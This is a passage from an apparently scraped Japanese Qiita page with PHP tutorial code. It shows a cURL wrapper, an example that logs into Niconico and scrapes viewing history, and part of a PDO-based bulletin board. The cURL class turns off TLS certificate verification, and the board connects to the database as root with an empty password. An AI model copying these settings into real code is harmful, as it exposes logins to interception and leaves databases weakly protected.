        <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
            <span class="nb">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$info</span> <span class="o">=</span> <span class="nb">stream_get_meta_data</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fp</span><span class="p">);</span>
        <span class="nv">$cookie_uri</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">'uri'</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
        <span class="nb">curl_setopt_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ch</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="nx">CURLINFO_HEADER_OUT</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
            <span class="nx">CURLOPT_AUTOREFERER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
            <span class="nx">CURLOPT_FOLLOWLOCATION</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
            <span class="nx">CURLOPT_RETURNTRANSFER</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">,</span>
            <span class="nx">CURLOPT_SSL_VERIFYPEER</span> <span class="o">=&gt;</span> <span class="k">false</span><span class="p">,</span>
            <span class="nx">CURLOPT_CONNECTTIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
            <span class="nx">CURLOPT_TIMEOUT</span> <span class="o">=&gt;</span> <span class="mi">15</span><span class="p">,</span>
            <span class="nx">CURLOPT_MAXREDIRS</span> <span class="o">=&gt;</span> <span class="mi">5</span><span class="p">,</span>
            <span class="nx">CURLOPT_COOKIEFILE</span> <span class="o">=&gt;</span> <span class="nv">$cookie_uri</span><span class="p">,</span>
            <span class="nx">CURLOPT_COOKIEJAR</span> <span class="o">=&gt;</span> <span class="nv">$cookie_uri</span><span class="p">,</span>
            <span class="nx">CURLOPT_ENCODING</span> <span class="o">=&gt;</span> <span class="s1">'gzip, deflate'</span><span class="p">,</span>
            <span class="nx">CURLOPT_USERAGENT</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span><span class="p">,</span>
            <span class="nx">CURLOPT_HTTPHEADER</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'Accept: '</span> <span class="o">.</span>
                    <span class="s1">'text/html,'</span> <span class="o">.</span> 
                    <span class="s1">'application/xhtml+xml,'</span> <span class="o">.</span>
                    <span class="s1">'application/xml'</span> <span class="o">.</span>
                    <span class="s1">';q=0.9,*/*;q=0.8'</span>
                <span class="p">,</span>
                <span class="s1">'Accept-Language: '</span> <span class="o">.</span>
                    <span class="s1">'ja,en-us;q=0.7,en;q=0.3'</span>
                <span class="p">,</span>
            <span class="p">),</span>
        <span class="p">));</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<h1>
<span id="example" class="fragment"></span><a href="#example"><i class="fa fa-link"></i></a>Example</h1>

<h3>
<span id="ニコニコ動画にログインして履歴を取得する例" class="fragment"></span><a href="#%E3%83%8B%E3%82%B3%E3%83%8B%E3%82%B3%E5%8B%95%E7%94%BB%E3%81%AB%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%81%97%E3%81%A6%E5%B1%A5%E6%AD%B4%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B%E4%BE%8B"><i class="fa fa-link"></i></a>ニコニコ動画にログインして履歴を取得する例</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">NicoNico</span> <span class="k">extends</span> <span class="nx">cURL</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$mail_tel</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">(</span><span class="s1">'Chrome'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'http://www.nicovideo.jp/login'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span>
            <span class="s1">'https://secure.nicovideo.jp/secure/login?site=niconico'</span><span class="p">,</span>
            <span class="k">array</span><span class="p">(</span>
                <span class="s1">'next_url'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
                <span class="s1">'mail_tel'</span> <span class="o">=&gt;</span> <span class="nv">$mail_tel</span><span class="p">,</span>
                <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="nv">$password</span><span class="p">,</span>
            <span class="p">),</span>
            <span class="nv">$info</span>
        <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s1">'url'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">'http://www.nicovideo.jp/'</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'ログインに失敗しました'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getHistory</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$regex</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.*?'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
            <span class="s1">'&lt;div class="outer" id="outer_sm(\d*+)"&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;img src="([^"]*+)" alt="([^"]*+)" class="video" /&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;span class="videoTime"&gt;([^&lt;]*+)&lt;/span&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;p class="posttime"&gt;(\d*+年\d*+月\d*+日 \d*+:\d*+)'</span><span class="p">,</span>
            <span class="s1">'&lt;span&gt;視聴回数(\d*+)回&lt;/span&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;li class="play"&gt;再生:([^&lt;]*+)&lt;/li&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;li class="comment"&gt;コメント:([^&lt;]*+)&lt;/li&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;li class="mylist"&gt;マイリスト:&lt;a href="[^"]*+"&gt;([^&lt;]*+)&lt;/a&gt;&lt;/li&gt;'</span><span class="p">,</span>
            <span class="s1">'&lt;li class="posttime"&gt;(\d*+年\d*+月\d*+日 \d*+:\d*+) 投稿&lt;/li&gt;'</span><span class="p">,</span>
        <span class="p">));</span>
        <span class="nv">$regex</span> <span class="o">=</span> <span class="s2">"@</span><span class="si">{</span><span class="nv">$regex</span><span class="si">}</span><span class="s2">@s"</span><span class="p">;</span>
        <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'http://www.nicovideo.jp/my/history'</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">,</span> <span class="nx">PREG_SET_ORDER</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">'履歴取得に失敗しました'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$matches</span> <span class="k">as</span> <span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$ret</span><span class="p">[]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'id'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
                <span class="s1">'url'</span> <span class="o">=&gt;</span> <span class="s2">"http://www.nicovideo.jp/watch/sm</span><span class="si">{</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
                <span class="s1">'thumb_url'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
                <span class="s1">'title'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
                <span class="s1">'duraction'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span>
                <span class="s1">'watched_at'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span>
                <span class="s1">'watched_count'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span>
                <span class="s1">'meta_watched_count'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span>
                <span class="s1">'meta_comment_count'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span>
                <span class="s1">'meta_mylist_count'</span> <span class="o">=&gt;</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span>
                <span class="s1">'meta_created_at'</span> <span class="o">=&gt;</span> <span class="s2">"20</span><span class="si">{</span><span class="nv">$match</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> 
            <span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$nico</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NicoNico</span><span class="p">(</span><span class="s1">'aaaaa@bbbbb.cc.jp'</span><span class="p">,</span> <span class="s1">'xxxxxxx'</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$nico</span><span class="o">-&gt;</span><span class="na">getHistory</span><span class="p">());</span>
</pre></div></div>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>array(30) {
  [0]=&gt;
  array(11) {
    ["id"]=&gt;
    string(8) "21280725"
    ["url"]=&gt;
    string(40) "http://www.nicovideo.jp/watch/sm21280725"
    ["thumb_url"]=&gt;
    string(45) "http://tn-skr2.smilevideo.jp/smile?i=21280725"
    ["title"]=&gt;
    string(69) "【オツキミリサイタル】歌ってみた　＠ゆいこんぬ"
    ["duraction"]=&gt;
    string(4) "3:45"
    ["watched_at"]=&gt;
    string(23) "2013年12月05日 14:10"
    ["watched_count"]=&gt;
    string(1) "1"
    ["meta_watched_count"]=&gt;
    string(7) "316,137"
    ["meta_comment_count"]=&gt;
    string(5) "4,322"
    ["meta_mylist_count"]=&gt;
    string(6) "14,802"
    ["meta_created_at"]=&gt;
    string(23) "2013年07月05日 17:57"
  }
  [1]=&gt;
  ....
</pre></div></div>

<h3>
<span id="このままシリアライズしてcookieを維持することも可能" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E3%81%BE%E3%81%BE%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%A9%E3%82%A4%E3%82%BA%E3%81%97%E3%81%A6cookie%E3%82%92%E7%B6%AD%E6%8C%81%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%82%82%E5%8F%AF%E8%83%BD"><i class="fa fa-link"></i></a>このままシリアライズしてCookieを維持することも可能</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'NicoNico.dat'</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$nico</span><span class="p">));</span>
</pre></div></div>

<h3>
<span id="間違った継承のしかたをすると例外をスロー" class="fragment"></span><a href="#%E9%96%93%E9%81%95%E3%81%A3%E3%81%9F%E7%B6%99%E6%89%BF%E3%81%AE%E3%81%97%E3%81%8B%E3%81%9F%E3%82%92%E3%81%99%E3%82%8B%E3%81%A8%E4%BE%8B%E5%A4%96%E3%82%92%E3%82%B9%E3%83%AD%E3%83%BC"><i class="fa fa-link"></i></a>間違った継承のしかたをすると例外をスロー</h3>

<ul>
<li>
<code>parent::__construct()</code> をコールせずに使おうとすると <strong>BadMethodCallException</strong> をスロー</li>
<li>
<code>static::getUserAgents()</code> が正しい配列を返さないと <strong>DomainException</strong> をスロー</li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />31位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>39</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/4ab192e04430119d5599">[MySQL版] ページング処理を採り入れた掲示板サンプル</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-26 03:49:08</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[MySQL]</b> <b>[PDO]</b> <b>[データベース]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="本編mysql編" class="fragment"></span><a href="#%E6%9C%AC%E7%B7%A8mysql%E7%B7%A8"><i class="fa fa-link"></i></a>本編(MySQL編)</h1>

<h3>
<span id="完成品イメージ" class="fragment"></span><a href="#%E5%AE%8C%E6%88%90%E5%93%81%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8"><i class="fa fa-link"></i></a>完成品イメージ</h3>

<p><a href="https://camo.qiitausercontent.com/9c263116d8e0e6f64fc20bc05eb28400329d5a85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61393538653539372d306264632d303238642d623936652d3664633737343438386635632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9c263116d8e0e6f64fc20bc05eb28400329d5a85/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61393538653539372d306264632d303238642d623936652d3664633737343438386635632e706e67" alt="ss (2013-08-30 at 04.35.47).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/a958e597-0bdc-028d-b96e-6dc774488f5c.png"></a></p>

<h3>
<span id="テーブル構造" class="fragment"></span><a href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E6%A7%8B%E9%80%A0"><i class="fa fa-link"></i></a>テーブル構造</h3>

<div class="code-frame" data-lang="sql"><div class="highlight"><pre><span></span><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">mini_board</span><span class="p">(</span>
  <span class="o">`</span><span class="n">id</span><span class="o">`</span> <span class="nb">int</span> <span class="n">UNSIGNED</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span> <span class="k">PRIMARY</span> <span class="k">KEY</span><span class="p">,</span>
  <span class="o">`</span><span class="n">name</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="o">`</span><span class="n">email</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="o">`</span><span class="nb">text</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">140</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="o">`</span><span class="n">time</span><span class="o">`</span> <span class="n">datetime</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span> <span class="k">DEFAULT</span> <span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8</span> <span class="k">COLLATE</span><span class="o">=</span><span class="n">utf8_general_ci</span>
</pre></div></div>

<h3>
<span id="コード" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>コード</h3>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* 設定 */</span>
<span class="c1">// DSN(Data Source Name)</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_DSN'</span><span class="p">,</span> <span class="s1">'mysql:dbname=test;host=127.0.0.1;charset=utf8'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">);</span>               <span class="c1">// ユーザー名</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PASS'</span><span class="p">,</span> <span class="s1">''</span><span class="p">);</span>                   <span class="c1">// パスワード</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'SESSION_NAME'</span><span class="p">,</span> <span class="s1">'MiniBoard'</span><span class="p">);</span>     <span class="c1">// セッションクッキーに用いる名前</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DISP_MAX'</span><span class="p">,</span>  <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// 1ページの最大表示数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'LIMIT_SEC'</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>                  <span class="c1">// 連続投稿を禁止する秒数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'TOKEN_MAX'</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// ワンタイムトークン蓄積最大数</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'Asia/Tokyo'</span><span class="p">);</span> <span class="c1">// タイムゾーン</span>
<span class="nb">mb_internal_encoding</span><span class="p">(</span><span class="s1">'UTF-8'</span><span class="p">);</span>           <span class="c1">// 内部エンコーディング</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * RuntimeExceptionを生成する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * 例外スタックのメッセージ部分を配列に変換する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* 変数の初期化 */</span>
<span class="c1">// リクエストパラメータをトリミングした後展開</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">,</span> <span class="s1">'page'</span><span class="p">,</span> <span class="s1">'submit'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// ページ番号を1以上の整数になるように補正</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$page</span><span class="p">);</span>

<span class="cm">/* セッションの初期化 */</span>
<span class="nb">session_name</span><span class="p">(</span><span class="nx">SESSION_NAME</span><span class="p">);</span> <span class="c1">// セッション名を設定</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>           <span class="c1">// セッション開始</span>
<span class="c1">// セッション変数を初期化</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SESSION</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
        <span class="s1">'prev'</span>  <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* PDOでの処理 */</span>
<span class="k">try</span> <span class="p">{</span>

    <span class="c1">// 接続</span>
    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="nx">DB_DSN</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASS</span><span class="p">);</span>
    <span class="c1">// プリペアドステートメントのエミュレーションを無効化</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_EMULATE_PREPARES</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="c1">// SQL実行でエラーが発生したときに例外をスローするように設定</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">setAttribute</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">);</span>
    <span class="c1">// 送信ボタンが押された場合</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// セッション変数に書き込む情報をセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
            <span class="c1">// ワンタイムトークンが直近指定個に含まれていなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'フォームの有効期限が切れています。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ワンタイムトークンを消費させる</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]);</span>
            <span class="c1">// 最後の投稿から指定秒経過していなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$diff</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">((</span><span class="nv">$limit</span> <span class="o">=</span> <span class="nx">LIMIT_SEC</span> <span class="o">-</span> <span class="nv">$diff</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s2">"投稿間隔が短すぎます。</span><span class="si">{</span><span class="nv">$limit</span><span class="si">}</span><span class="s2">秒ほどお待ちください。"</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// 名前をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前は30字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Eメールアドレスをチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'有効なEメールアドレスを入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 本文をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'本文は140字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 例外がここまでに1つでも発生していればスローする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// プリペアドステートメントを生成</span>
            <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nb">implode</span><span class="p">(</span><span class="s1">' '</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'INSERT'</span><span class="p">,</span>
                <span class="s1">'INTO mini_board(`name`, `email`, `text`, `time`)'</span><span class="p">,</span>
